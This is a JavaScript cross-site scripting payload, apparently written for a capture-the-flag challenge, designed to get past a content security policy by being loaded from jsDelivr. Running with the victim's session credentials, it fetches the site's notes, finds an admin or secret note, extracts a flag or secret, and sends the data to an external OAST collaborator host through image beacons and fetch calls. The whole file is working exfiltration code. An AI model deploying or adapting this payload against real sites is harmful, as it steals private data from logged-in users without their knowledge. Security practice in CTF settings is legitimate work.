// payload.js - designed for jsDelivr + CSP( script-src 'self' https://cdn.jsdelivr.net ; img-src * )
// - fetches /notes, finds candidate admin note link containing 'secret:' or 'admin notes'
// - fetches that note's page, extracts text, sends to OAST via Image beacon (and tries fetch as fallback)

(async function(){
  const OAST = 'https://m6t0wfu6amhk72tg37oqazpkkbq2es2h.oastify.com';
  const maxChunk = 1900; // keep querystring length reasonable
  const log = (...args) => {
    try { console.log('[PAYLOAD]', ...args); } catch(e){}
  };

  try {
    // 1) get notes listing (HTML)
    const res = await fetch('/notes', { credentials: 'include' });
    const html = await res.text();
    log('fetched /notes length', html.length);

    // 2) try find note link with keywords
    // find href="/notes/123" maybe near 'secret' or 'admin notes'
    let noteId = null;

    // first try: look for "secret:" in HTML and find nearest /notes/X
    const secretIndex = html.indexOf('secret:');
    if (secretIndex !== -1) {
      // look backwards for href="/notes/<id>"
      const before = html.slice(Math.max(0, secretIndex - 400), secretIndex + 400);
      const m = before.match(/href="\/notes\/(\d+)"/);
      if (m) noteId = m[1];
    }

    // fallback: search for "admin notes" title then id
    if (!noteId) {
      const mm = html.match(/href="\/notes\/(\d+)"[^>]*>[^<]*admin/i);
      if (mm) noteId = mm[1];
    }

    // fallback: grab first /notes/N link
    if (!noteId) {
      const m2 = html.match(/href="\/notes\/(\d+)"/);
      if (m2) noteId = m2[1];
    }

    log('found noteId?', noteId);

    if (!noteId) {
      // if nothing found, send some of the listing to OAST to inspect
      const sample = encodeURIComponent(html.slice(0, maxChunk));
      new Image().src = `${OAST}/collect?part=notes-list&d=${sample}`;
      return;
    }

    // 3) fetch specific note detail
    const r2 = await fetch('/notes/' + noteId, { credentials: 'include' });
    const noteHtml = await r2.text();
    log('fetched /notes/' + noteId + ' length', noteHtml.length);

    // 4) extract visible text (naive)
    const text = noteHtml.replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, '')
                         .replace(/<\/?[^>]+(>|$)/g, ' ')
                         .replace(/\s+/g, ' ')
                         .trim();

    // 5) find likely flag-like substring: PETIR{...} or secret:
    let found = null;
    const petir = text.match(/PETIR\{[^}]{1,200}\}/);
    if (petir) found = petir[0];
    if (!found) {
      const sec = text.match(/secret[:\s]*([^\s]{3,200})/i);
      if (sec) found = sec[0];
    }
    if (!found) {
      // fallback: send first chunk of full text
      found = text.slice(0, maxChunk);
    }

    // 6) chunk & send to OAST; try image beacon (most reliable under CSP img-src *)
    for (let i = 0; i < found.length; i += maxChunk) {
      const chunk = found.slice(i, i + maxChunk);
      const url = `${OAST}/collect?part=${encodeURIComponent(noteId)}&i=${i}&d=${encodeURIComponent(chunk)}`;
      try {
        new Image().src = url;
        log('beacon sent', url.slice(0,80));
      } catch(e){}
      // also attempt fetch (silent)
      try { fetch(url).catch(()=>{}); } catch(e){}
    }

    // optionally, try to make the flag visible in DOM for screenshot debugging
    try {
      const banner = document.createElement('div');
      banner.id = 'xss-flag-found';
      banner.style.position = 'fixed';
      banner.style.top = '0';
      banner.style.left = '0';
      banner.style.right = '0';
      banner.style.background = 'red';
      banner.style.color = 'white';
      banner.style.fontSize = '18px';
      banner.style.zIndex = 2147483647;
      banner.style.padding = '8px';
      banner.innerText = 'FLAG: ' + (found.slice(0,200));
      document.documentElement.prepend(banner);
    } catch(e){}
  } catch (e) {
    try {
      new Image().src = `${OAST}/error?e=${encodeURIComponent(String(e).slice(0,300))}`;
    } catch(e2){}
  }
})();
